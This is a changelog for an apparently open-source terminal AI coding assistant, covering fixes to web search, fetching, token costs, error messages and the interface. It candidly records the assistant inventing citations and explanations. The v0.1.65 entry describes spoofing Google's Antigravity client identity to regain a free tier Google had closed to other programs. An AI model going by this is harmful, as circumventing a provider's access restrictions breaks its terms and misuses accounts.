Google Search grounding (flash returns 200 with no `groundingMetadata`, pro
returns 400), and the envelope is not the cause — gemini-cli places `tools`
identically.

## v0.1.75 — 2026-08-08 — the agent can search the open web, and stops claiming tools it no longer has

Full dual-track document: [v0.1.75-release-notes.md](v0.1.75-release-notes.md).

**Plain-language version:** Until now this program could look things up in
academic and reference databases — papers, books, Wikipedia — but it had no way
to search the ordinary web. Ask it about something on a normal website without
giving it a link, and it had nothing to work with.

It can now search the open web, but only if you run your own copy of a search
engine called SearXNG on your own machine. That is a deliberate choice, not an
apology: every commercial search API has either closed to new users, been
retired, or now wants a credit card. Running your own costs nothing, needs no
account, and nobody logs what you searched for. Setup instructions are in the
full notes.

If you have not set it up, the assistant is told plainly that web search is off
and to ask you for a link rather than guess. That refusal matters more than it
sounds: the worst thing this program has ever done was invent a table of
academic citations when it could not search — real-looking links leading to
completely different papers. A tool that says "I could not search" is safe; one
that quietly returns nothing teaches the assistant that nothing exists. For the
same reason, when the search runs but the engines behind it are blocked, that is
now reported as a failure rather than as "no results found".

The second fix is a quieter version of the same problem. You can switch
individual tools off to save bandwidth, and one key switches off five at once.
But the assistant's instructions were written as though every tool were always
there — so in low-bandwidth mode it was still being told "you can open web pages,
never say you cannot reach a page" at the exact moment it could not. That is an
instruction to make something up. Those lines now disappear along with the tools
they describe.

**Technical:** `web_search` gains `source: web`, backed by a self-hosted SearXNG
(`searxngURL` in config.json or `SEARXNG_URL`). Chosen because it is the only
key-free general-web backend left — Google's Custom Search JSON API is closed to
new customers, Bing's is retired, Brave needs a card, Mojeek is sales-gated —
and because its `unresponsive_engines` field distinguishes "nothing matched"
from "everything was blocked". Zero results with every engine dead is an error,
not an empty result set. Its HTTP client deliberately skips the SSRF guard
(SearXNG runs on loopback); the exemption rests on provenance — the host comes
from config, the model controls only the query string — and redirects are
refused so nothing can inherit it. Separately, prompt lines may now carry
`[[needs tool.x]]` and are dropped when that component is off, with the marker
stripped before send; a section gated down to a bare header is dropped entirely.

## v0.1.74 — 2026-08-07 — a price tag on big pages, a quota you can scroll back to, and a model that stops inventing its own methods

Full dual-track document: [v0.1.74-release-notes.md](v0.1.74-release-notes.md).

**Plain-language version:** Three fixes, all from watching it fail in front of a
user. When the assistant reads a web page, that page joins the conversation — and
the AI re-reads the whole conversation every time it replies, so a big page isn't
charged once, it's charged again on every message after it. One page quietly ate
88% of the assistant's memory and nobody mentioned it. Now a note appears saying
what it costs, and offers to shorten it on your own computer for free. Only
genuinely enormous pages get cut, and it says so clearly — the entire text of
*Romeo and Juliet* fits under the limit, so papers and manuals are untouched.

The quota display used to vanish as soon as you carried on working, and checking
it again used up more quota. It now also stays in the scroll-back history with
the time beside it, so you can see what was left earlier and work out how fast
you're burning through it, for free.

And when we asked the assistant to explain how it had searched for something, it
described settings that don't exist, checks it never did, and blamed a technical
fault that wasn't real — when the true answer was "I only tried one search word".
The explanation sounded *more* trustworthy than the original answer, because it
was well organised and admitted mistakes. It is now told that explaining its own
work is a claim like any other: read what actually happened, and if you don't
know why something failed, say so.

Not verified: nobody has yet seen the `/usage` line appear in the history — that
needs one person to type it and look. The prompt line ships on reasoning, not
measurement.

## v0.1.73 — 2026-08-07 — the token sieve: 92% less sent, and a way to find the free copy

Full dual-track document: [v0.1.73-release-notes.md](v0.1.73-release-notes.md).

**Plain-language version:** When you asked the assistant to read a web page, it
used to send the entire page to the AI service — menus, advertising scripts,
cookie banner, footer — and you were charged for every word, then charged again
each time the conversation continued. We measured it across eight real pages:
**ninety-two percent of what you were paying for was not the article.** One
GitHub file page cost 62,083 tokens to display a README whose actual content was
363. This release sends 92% less.

That matters because of who this is for. A family living on a dollar a day cannot
absorb two dollars a month, and there is no version of "it's only a few cents"
that survives that arithmetic. Send small enough requests and you never pay at
all — you stay inside the free allowances permanently. At a typical free daily
allowance the difference we measured is between sixteen pages a day and 2,754.

The assistant can also now **search** for papers and books instead of guessing
web addresses, and — the part that matters most — when it finds a paper behind a
paywall it checks whether a **legal free copy** exists elsewhere. Very often one
does, posted by the authors or their university. Measured on one query, seven of
ten results carried a free legal full text. Nobody should be told to pay $40 for
a paper that is free on the next page.

It now also says clearly when it *cannot* search, instead of inventing a source —
a real failure we observed and fixed. Long documents are shortened on your own
computer using mathematics rather than AI, and the summary always says how much
it cut and warns that the dropped parts may include the paper's own caveats. And
the download itself is 26% smaller, which is about forty minutes back on a slow
connection.

Not verified: no live test over a genuinely slow link; TextRank is unit-tested
but not yet driven end-to-end on a real full-text document; token counts are
byte/4 estimates; the prompt experiment remains pre-registered and unrun.

## v0.1.72 — 2026-08-07 — the model could always read the web, and kept telling you it couldn't

Full dual-track document: [v0.1.72-release-notes.md](v0.1.72-release-notes.md).

**Plain-language version:** The assistant could always read web pages. It just did
not know it could. The tool was called `fetch`, the word "web" appeared once in
its whole description and never in its name, and the system prompt never
mentioned the internet at all — so against a strong trained belief that "I am a
language model, I cannot browse the web", the assistant kept refusing a perfectly
ordinary request and giving a false reason for it. It is now called `web_fetch`,
its description opens by saying the capability exists, and the prompt says so too.

Two other faults in the same tool. It could have been redirected into your home
network or a cloud server's internal admin address — the check looked at the
address you typed and never at where the connection actually went; it now checks
every hop, immediately before connecting. And it asked every website for the full
rendered page when a clean text version was often available, downloading roughly
fifty times more than it needed. That is invisible on fast broadband and it is
minutes of waiting on a slow or satellite link — and because AI assistants charge
by the word and re-read the whole conversation on every reply, the navigation
menus and cookie banners were being billed to you again and again.

Also fixed: a page cut off at the 5MB limit was silently handed over as if
complete, so the assistant would confidently summarise a document it had only
partly read; failed requests threw away the server's explanation; non-UTF-8 pages
arrived as gibberish; PDFs came back as binary noise; and `format` was a required
argument, so the obvious way to call the tool failed outright.

Not verified: no live fetch over a genuinely slow link, no measured hit rate for
the markdown negotiation, and no measurement of the prompt line's effect on
behaviour — that last one has a pre-registered experiment that still has not
been run.

## v0.1.71 — 2026-08-07 — providers that said "ready" and then refused, and a log filter that ate the error

Full dual-track document: [v0.1.71-release-notes.md](v0.1.71-release-notes.md).

**Plain-language version:** Four things were quietly broken, and each one made the
app misreport its own state. It showed a provider as "ready" and then refused to
use it, because the startup picker and the thing that validates your choice had
two different ideas of what "configured" means — providers you had never opened
worked, ones you had worked on did not. Conversations with Cloudflare stopped
dead at the first tool the assistant used and never recovered, because a bad
message stays in the history forever; session titles failed for a separate reason
in the same family. The filter that trims noisy build output was throwing away
the error line itself, on exactly the big kernel and browser builds it exists
for. And if the provider you picked at startup turned out not to work, there was
no way back to that screen — now `/providers` reopens it. Two models in the list
also gained a note saying they held their ground when a user insisted they were
wrong, with the number of times we checked printed next to it, because two checks
is not many.

Fixes: environment-variable provider keys no longer hidden by a stale
`disabled:true`; `"content": null` and `"tools": []` no longer sent, which
unblocks Cloudflare Workers AI for tool use, session titles and compaction;
`filterBuildLog` no longer discards the signal line it matched on; `/providers`
reopens the launch picker mid-session; `openai/gpt-oss-20b` added to the NIM
catalogue; coder prompt gains a `# precedence` section (~160 tokens, switchable
in `/context`).

Not verified: no interactive TUI run — the `/providers` flow wants one human
confirmation. The prompt precedence work has a pre-registered experiment that has
not been run.

## v0.1.70 — 2026-08-05 — the error you needed to read was being deleted, and the input box ignored the window

Full dual-track document: [v0.1.70-release-notes.md](v0.1.70-release-notes.md).

**Plain-language version:** v0.1.68 promised that a failed turn would leave the
full explanation in your conversation. It did not work, and this release is
mostly about admitting that and fixing it properly — the reason was recorded
correctly and then deleted a fraction of a second later by a different piece of
code, so you saw "Canceled — no answer was produced" for a failure that had
nothing to do with cancelling. Four more fixes ride along. Errors now stay on
screen forty seconds instead of ten, because a provider failure is a sentence you
must read and act on, not a "copied to clipboard" toast. The app no longer
guesses that your request was "too large" when it already knows the real cause —
that guess was appearing directly above a message contradicting it, with the
context reading 0%. Switching model from `/models` no longer strands the three
helper agents (session titles, summarising, sub-tasks) on the old model, where
the only clue was a recurring "failed to generate title" and the real failures
waited until later. And the input box no longer outgrows the window: it had been
ignoring its row allotment entirely — handed 1, 2, 3 or 5 rows it drew 16 every
time — so on a short terminal a long prompt appeared stuck on one line, scrolling
"from the last word", while the same build wrapped perfectly in a taller window.
It now respects the space available and says so (`▲ N more lines`) when holding
text back. Two flaky tests were also repaired, one of which guards the
footer-width invariant behind the old marching-footer bug.

## v0.1.69 — 2026-08-04 — the provider menu finds your setup whatever you named it

Full dual-track document: [v0.1.69-release-notes.md](v0.1.69-release-notes.md).

**Plain-language version:** the startup menu asked for an NVIDIA NIM key that was
already saved, and showed the NVIDIA row as not set up while Groq, Cerebras and
xAI showed `(ready)`. Retyping the key would have looked like a fix and then it
would have asked again on the next launch, forever. The key was never lost — the
menu looked for your NVIDIA connection **by name**, searching for an entry called
exactly `NVIDIA NIM`, so one named anything else (`Gorilla.FREE.NVIDIA.NIM`) was
invisible. A connection is identified by where it points, not by what you called
it. The same mistake had a quieter second symptom: choosing NVIDIA also wrote the
app's fixed name back, creating a **second** entry beside yours on the same
address — and two entries on one address fight over which serves the models,
which is how a config ended up with two NVIDIA connections and zero usable models
between them. Both halves now match by address; re-picking a provider updates
your existing entry and carries your saved key across, so pressing Enter on the
row can never wipe a working credential. Notably, model *registration* already
resolved by address and was name-agnostic — so the endpoint worked fine for
inference while the menu insisted it was missing. If this was already broken for
you it repairs itself on the next launch; no action needed.

## v0.1.68 — 2026-08-04 — when something fails, you can finally read why

Full dual-track document: [v0.1.68-release-notes.md](v0.1.68-release-notes.md).

**Plain-language version:** an error used to read `failed to process events: POST
"https://…/v1/chat/completions": 404 Not Found`, which looks like the app or the
network is broken. It was neither — the key was fine and the provider was simply
refusing to run that one model for that account, and working that out took an
evening. Errors are now written in English (*"Llama 3.3 70B isn't enabled for your
account (HTTP 404 — your key is fine). Pick another with /models."*) with the raw
machine error kept alongside, never instead — a translation that throws away the
evidence is worse than none when the translation is wrong. 401 and 404 give
deliberately different advice, because sending you to regenerate a perfectly good
key is its own waste. Failures now also land in the transcript, where they can be
scrolled, selected and copied, instead of flashing past in a status bar that cuts
off at ~100 characters and is wiped by the next message. The jargon prefix
"failed to process events" is gone. A turn where the model runs a command instead
of talking is no longer labelled "Finished without output" as though it had
crashed. And a text-mangling bug was found while fixing the above: the status bar
shortened messages by counting bytes rather than characters, so any dash or
accented letter on the cut point was sliced in half — harmless for plain English,
but the new error messages contain "—" and "⟨⟩", so the fix above would have
started triggering it. Provider error text is now stored locally in your session
database; inspected errors carry only method, URL and status, though this has not
been audited across every provider.

## v0.1.67 — 2026-08-04 — the provider picker stops cutting names in half

Full dual-track document: [v0.1.67-release-notes.md](v0.1.67-release-notes.md).

**Plain-language version:** the every-launch provider menu and the extras screen
squeezed themselves into 76 characters regardless of terminal size, so provider
names and descriptions were chopped off mid-word on a wide window. The 76 was a
legitimate *fallback* for before the terminal reports its size, but it was also
being used as a *ceiling*, so the real width was ignored once known. It now
applies only when the width is genuinely unknown. Display-only; no settings, keys
or sessions touched. **These notes were written after the fact, during the
v0.1.68 release — v0.1.67 shipped with no changelog entry and no notes inside its
package. That was an oversight, and this entry exists so the release is not a hole
in the record.**

## v0.1.66 — 2026-08-04 — the free Claude/GPT tier now actually works when you use it

Full dual-track document: [v0.1.66-release-notes.md](v0.1.66-release-notes.md).

**Plain-language version:** v0.1.65 shipped free Claude/GPT-OSS/Gemini and then three
bugs made it fall over the moment you actually used it. First, signing in to
Antigravity *looked* like it worked but silently ran Gemini instead of the model you
picked — the app forgot to record the sign-in until the next restart, so it decided
the provider "wasn't configured" and fell back (`agent "coder" model
"antigravity.claude-sonnet-4-6" is unusable ... falling back to
"gemini-flash-latest"`). Second, typing `/usage` said "Unknown command". Third — the
big one — Claude and GPT-OSS crashed the instant they used a tool
(`invalid_request_error: ...tool_use.id: Field required`), which for a coding
assistant means they could chat but couldn't actually help. All three are fixed and
each has a test that fails without the fix. Gemini was fine throughout and is left
untouched.

### Fixed

- **Signing in to Antigravity now uses the model you chose, first session included.**
  The provider is registered in-session the instant login succeeds
  (`UpsertProviderKey` with the `oauth-login` sentinel), before agent models are set —
  so `validateAgent` no longer silently reverts every agent to Gemini. Same fix
  applied to the Google-only and GCP login paths.
- **Claude and GPT-OSS can use tools again.** Their native (Anthropic/OpenAI) format
  requires a tool-call `id`; we were sending the Gemini shape, which has none, so any
  conversation containing a tool call 400'd. Tool-call ids are now emitted on the
  Antigravity path only (Gemini matches by name and is unchanged), and the backend's
  own id is preserved from responses. This is what made Claude/GPT usable for real
  coding rather than chat-only.
- **`/usage` works when typed**, not just from the command palette, and now appears in
  `/help`.

### Note (not a bug)

- Hot-swapping models mid-conversation can make the assistant misidentify itself
  (claim to be Claude, then admit it's Gemini). That's each model reading the shared
  history; the one actually on Gemini corrected itself. Nothing changed here.

## v0.1.65 — 2026-08-03 — Claude, GPT-OSS and Gemini for free, through your own Google account

Full dual-track document: [v0.1.65-release-notes.md](v0.1.65-release-notes.md).

**Plain-language version:** two things. First, the free Gemini sign-in had stopped
working — Google quietly closed the free "Code Assist" tier to every program except
their own new app, Antigravity, and answered our requests with "migrate to
Antigravity". Having the program introduce itself the way Google now expects (a
one-word change to how it identifies itself, on the sign-in step only) opens that
door again. Second — and this is the treat — every Gmail account already has a
generous **free** Antigravity allowance that includes **Claude (Sonnet and Opus
4.6), GPT-OSS, and Gemini**, and until now the only way to spend it was Google's own
tool. This release adds an **"Antigravity free tier"** sign-in that unlocks all of
them at no cost, using the allowance already attached to your own Google account.
On top of that, a **provider menu now appears on every launch** (one press of Enter
keeps what you had), and **`/usage`** shows how much of your weekly free allowance is
left — it also appears on its own at the start of each session. The Antigravity route
is unofficial: it works by speaking to Google the way Google's Antigravity tool does,
so Google could change something and break it — that is stated plainly and kept
isolated so nothing else depends on it. The Gemini fix uses Google's supported login
and carries no such risk.

### Added

- **"Antigravity free tier" provider** — sign in with Google and use your own free
  Antigravity allowance: Claude Sonnet 4.6, Claude Opus 4.6 (Thinking), GPT-OSS 120B,
  and Gemini, at cost 0. New OAuth identity (`internal/auth/antigravity_oauth.go`) and
  transport (`internal/llm/provider/antigravity.go`), reusing ~90% of the existing
  Code Assist client. Protocol captured from the installed Antigravity CLI, not
  guessed; transport proven end-to-end through the program's own code (Claude replied).
  **Unofficial and brittle** — Google can change it; the risk is isolated to this
  provider.
- **Every-launch provider portal** — a startup menu listing every way to connect, with
  the cursor on your current provider so Enter continues in one keystroke. Reachable
  from the desktop icon, not just a typed flag. Replaces the old "edit the env file and
  relaunch" first-run dead-end. Keys are entered masked.
- **`/usage`** — shows your Antigravity weekly quota as one line, on demand and
  automatically at session start (silent for non-Antigravity users). Wire shape
  unit-tested against the captured response so a Google-side change fails a test
  rather than blanking the view.

### Fixed

- **The free Gemini "Login with Google" tier works again.** Google discontinued the
  free Code Assist tier for non-Antigravity clients (`UNSUPPORTED_CLIENT`). Sending an
  `antigravity` product token in the `User-Agent` on the onboarding calls restores
  free-tier eligibility and project provisioning. Root-caused live; the header is sent
  on onboarding only — generation rejects it with 403. The earlier HTTP 500 was a blank
  project, not the generation call.

### Also included (pre-existing)

- A **DeepSeek** provider added in an earlier development session
  (`internal/llm/models/deepseek.go` and related edits) ships in this tag by the
  maintainer's decision. Not part of this release's work; noted for completeness.

## v0.1.48 → v0.1.64 — 2026-07-31 — The conversation no longer stops dead at the first tool call

Sixteen builds made between 28 and 31 July 2026, none of which were ever
published. This entry covers all of them. Full documents:
[layman](v0.1.48-v0.1.64-LAYMAN.md) · [developer](v0.1.48-v0.1.64-DEVELOPER.md).

**Plain-language version:** for three days this program had a bug that made it
close to unusable, and it hid itself well. When the AI used a tool — searching
your files, running a command — the answer arrived, was saved, and was never
shown to you. The screen sat on "Waiting for response…". On 30 July a command
finished in two seconds, the AI wrote its full answer, and the screen showed
nothing for fifteen minutes; that is indistinguishable from a stuck connection,
so you wait, then restart, then blame your provider. Every conversation that
used a tool was cut off at its first tool call. Alongside it, one search could
return 2.4 megabytes in a single result and quietly wreck your token budget, the
context meter read about two hundred times too high, Escape did not stop the AI,
and the bar at the bottom of the screen crawled down the window and jumped back
up. All fixed. Every one was found by measuring, not by reasoning about the code.

### Fixed

- **The transcript no longer halts at the first tool result** (v0.1.63). The
  biggest fix here. `ScrollbackReady` returned false for tool messages to stop
  double-printing, but `printPending` breaks on the first not-ready message — so
  every later message, including the model's finished answer, was generated,
  persisted, and never displayed. **"Ready" means "will not change again", not
  "has something to show".** Duplicate suppression moved to
  `RenderForScrollback` returning `""` for that role.
- **Every tool result is bounded by SIZE at one choke point** (v0.1.62). grep
  capped matches at 100 and returned **2,438,026 bytes**, because it matched
  inside files where a whole source file is one escaped string — 80 lines over
  10 KB, longest 66,438. That one result took a conversation from 15.9K to 675K
  tokens in a single turn, and tool results are re-sent every turn afterwards.
  Now 400 KB in `NewTextResponse`. **A limit must be expressed in the unit of
  the resource it protects.**
- **No frame line may exceed the terminal width** (v0.1.57) — the real cause of
  the marching footer. The inline renderer erases by *logical* line count, so an
  over-wide line occupies two physical rows, counts as one, and under-erases by
  a row per render. Enforced centrally by `clampToWidth`.
- **The context meter was inflated ~200×** (v0.1.55); it displayed 387%. Failed
  turns now say why they failed instead of printing nothing.
- **Escape actually stops the model** (v0.1.54), and streamed reasoning wraps at
  word boundaries.
- **It says why there is no thinking** when you asked to see thinking (v0.1.60).

### Added

- Up and Down recall previous messages (v0.1.64).
- Reasoning streams into scrollback; the preview pane is gone (v0.1.58–v0.1.61).

### Changed

- All four system prompts rewritten (2026-07-29) against Anthropic's published
  Claude Fable 5 guidance, with the research cited in
  [`system-prompts/RESEARCH-SOURCES.md`](../system-prompts/RESEARCH-SOURCES.md).
  Coder prompt 1,855 → 4,233 bytes (~464 → ~1,058 tokens/turn). Every section is
  switchable in `/context` with its cost and what you lose; two are marked
  critical because disabling them increases unverified success claims.

### Known issues

- **The footer is still reported to jump.** Two hypotheses are dead, both with
  permanent tests: height oscillation, and the 20-row editor collapse. Diagnose
  with a real byte capture replayed through `internal/tui/inline/terminal_test.go`
  — not from a screenshot.
- **The v0.1.57 width fix is verified headlessly only**, not across a long
  interactive session. It bites hardest near 80 columns.

### Corrections to the record

- **v0.1.56 was shipped on a wrong diagnosis.** Frame-height oscillation was
  blamed for the marching footer; a headless test shows 3↔4 rows and a 20→1
  collapse both render correctly. The change was kept (constant height is still
  more predictable) but its commit message states a cause that is not real.
  Three independent sources reached that same wrong answer.
- **v0.1.59 shipped with a failing test.** A shell chain did not gate on the
  exit code and printed "all green" while a test was red. A pipe returns the
  last command's status, not the test's.
- **The v0.2.0 / v0.1.49 version numbers were never real.** They were invented
  in error, never approved, and the release carrying them had no downloadable
  assets. Both have been removed. The documents written under them were good
  work and are kept; only the numbers are gone.

## v0.1.46 — 2026-07-28 — Undoing a slowdown I caused, and giving the mouse back

Three complaints, three real causes — but only one was what it looked like.

**Plain-language version:** the interface genuinely had got slower, by code I added in
v0.1.45; it is now slightly quicker than before that release. The *models* were never
slower — v0.1.45 stopped under-reporting their time by a factor of a thousand, so an
84-second reply that used to read `84ms` now reads what it always was. And dragging to
select text typed garbage into the input box because the program had quietly taken the
mouse away from your terminal; it no longer does.

### Fixed

- **Dialog redraws were 2–3× more expensive** (`internal/tui/layout/fit.go`) —
  `FitHeight` re-ran its whole render-and-measure search on every `View()`, and Bubble
  Tea calls `View()` on every keystroke **and** every streamed token. Instrumented at
  **3 internal renders per frame** for `/context`. `layout.Fitter` now caches the row
  count that last fitted, verify-then-reuse. Measured like-for-like at 100×30:

  | | v0.1.44 | v0.1.45 | now |
  |---|---|---|---|
  | `/context` | 2.33 ms | **6.65 ms** | **2.05 ms** |
  | `/help` | 1.28 | 2.70 | 1.35 |

  The first version of that cache keyed on terminal size alone and only asked *"does
  the remembered count still fit"*, never *"could more fit now"* — so one cramped
  selection locked in a small list and **two commands became unreachable** while
  scrolling `/help`. An existing reachability test caught it, not me.

- **Dragging to select typed raw escape codes into the editor** (`cmd/root.go`) —
  reported as `[<32;71;41M`. The program requested cell-motion mouse tracking, which
  takes the mouse from the terminal (Shift then needed to select) and reports **one
  event per cell crossed**, so a single drag fires hundreds and stalls the loop until
  the input parser spills raw codes. Dropping non-wheel events in `Update` was too
  late — the cost is upstream of any handler. Mouse reporting is now **opt-in**, with a
  `/settings` row that states the trade. Verified on the real binary under a pty:
  **`?1002h` emitted 0 times off, once on.**

- **One `/context` figure was still a guess** (`internal/llm/agent/calibrate.go`) —
  token costs are measured from real tool schemas at startup, except `diagnostics`,
  which was guarded on having LSP clients. A schema is static, so with every language
  server off — supported, and this developer's setup — that one row showed an estimate.
  Now measured unconditionally, with a test asserting no component still reports its
  declared value.

### Changed

- **One prompt rule relaxed, six kept** (`coder-modern.txt`) — Anthropic's Claude 5
  context-engineering guidance reports removing 80%+ of their coding agent's system
  prompt with no eval loss, and its worked example is a rule we also had. Ours now
  reads `comments: match surrounding density and idiom` instead of `never explain
  WHAT/WHY`. The other six `do not`/`never` lines were reviewed and **kept**: five are
  verification and honesty rules (*never claim unobserved success*, *do not invent
  paths*), and the guidance is about trusting judgement on **style**, not about
  trusting an agent's account of its own work.

- **The release tooling refuses to commit deletions** (`release_pipeline.py`) — it ran
  `git add -A` unguarded. **Nine files of published research under `system-prompts/`
  were sitting deleted in the working tree while this was being written**, unnoticed
  for hours, one release from being written permanently into a tag. Now it stops and
  lists them. It also fast-forwards `main` to the tag, which it never did — the
  omission behind `main` once sitting 43 commits behind.

- **`CLAUDE.md` now documents `release_pipeline.py`**, which has a `go_gorilla` profile
  built for this repo and was undocumented. That cost four consecutive releases driven
  by hand by sessions that never knew it existed.

### Known issues

- **The display corruption reported alongside the mouse leak was never reproduced.**
  Message rendering, the reasoning block, a 4,000-character unbreakable paste and the
  split layout all produce uniform widths headlessly. Attributing it to the mouse flood
  is reasoning, not proof — if it survives this release, that was wrong.
- The size sweep covers **8 of ~15** dialog surfaces; the rest may overflow undetected.
- **Tool descriptions are ~3,680 tokens against the prompt's ~464** and are the real
  cost centre — but there is zero duplication and no prescriptive language left in
  them, so the safe cuts are spent. Trimming further without an eval risks a quietly
  worse agent. Not attempted.
- `layout.Fitter`'s cache key is caller-supplied; nothing enforces completeness.
- The main interface still cannot be selected or copied.

